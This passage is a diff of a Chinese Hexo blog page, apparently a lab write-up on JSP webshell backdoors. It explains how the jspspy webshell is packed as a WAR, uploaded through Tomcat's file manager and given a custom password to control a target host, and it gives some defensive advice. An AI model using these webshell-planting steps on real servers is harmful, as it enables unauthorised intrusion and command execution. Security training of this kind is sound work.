 <p>有一些服务器软件会使用到WAR，其中一些会提供用户上传WAR文件的接口。有些会允许用户使用一些外部源，利用这些接口上传jspspy.war木马文件，获取权限，最终控制目标主机。</p>
 <h3 id="win系统的jsp-webshell后门危害"><strong>2、Win系统的JSP
@@ -522,7 +512,7 @@ Webshell后门危害</strong></h3>
 Webshell后门防范</strong></h3>
 <p>当前最有效的解决办法，就是用软件查杀/入侵防护系统，快速对网站文件进行扫描，找出隐藏深处的网页木马并处理。
 　　然后，设置好ftp服务器，防止上传木马文件；将文件系统设置存储权限；不要使用超级用户运行web服务；将可以极大提高服务器和网站的安全性。</p>
-<h2 id="二实验环境-2"><strong>二、实验环境</strong></h2>
+<h2 id="实验环境-2"><strong>2. 实验环境</strong></h2>
 <ul>
 <li>操作机：Windows</li>
 <li>目标机：Ubuntu</li>
@@ -530,12 +520,12 @@ Webshell后门防范</strong></h3>
 </ul>
 <p>jspspy.jsp是一款集成文件管理、数据库管理、命令执行等功能的木马文件。文件管理可以上传木马文件进行进一步提权，也可以下载有用的文件；数据库管理可以查询到数据库内容，获取有用信息；命令执行可以执行相关命令，添加管理用户等。</p>
 <p>jspspy.war是一个war压缩包，里面有jspspy.jsp木马文件，是为了在web服务器能够上传war格式文件而做的一个压缩包文件。</p>
-<h2 id="三实验过程-2"><strong>三、实验过程</strong></h2>
+<h2 id="实验过程-2"><strong>3. 实验过程</strong></h2>
 <h3
 id="利用tomcat文件管理上传war的木马文件"><strong>1、利用Tomcat文件管理上传war的木马文件</strong></h3>
 <p>用记事本或者其他文本编辑软件打开“jspspy.jsp”这个 JSP Webshell
 文件，找到如下这一行：</p>
-<p><code>private static final String PW = "123456";    //password</code></p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">String</span> PW = <span class="string">&quot;123456&quot;</span>;    <span class="comment">//password</span></span><br></pre></td></tr></table></figure>
 <p>可自定义更改这个默认的管理登录密码“123456”。</p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4c5a500c9.png" /></p>
 <p>首先把jspspy.wav压缩成raw格式，使用 Windows Rar
@@ -661,7 +651,7 @@ Shell”编辑框是调用“cmd.exe”来执行系统命令，格式为“cmd.e
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">10:13</span>
+    <span title="站点阅读时长">10:14</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
